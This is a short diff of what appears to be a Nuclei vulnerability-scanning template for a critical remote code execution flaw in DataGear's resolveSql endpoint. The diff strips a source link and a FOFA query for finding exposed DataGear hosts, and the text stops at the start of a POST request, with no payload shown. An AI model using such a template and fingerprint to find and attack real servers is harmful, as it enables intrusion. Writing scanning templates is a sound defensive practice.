@@ -3,12 +3,8 @@ info:
   name: DataGear平台 resolveSql 存在远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vz8po9drya75ly6d'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vz8po9drya75ly6d
-    fofa: body="changeThemeData?theme=" || body="DataGear"
 http:
 - raw:
   - 'POST /dataSet/resolveSql HTTP/1.1
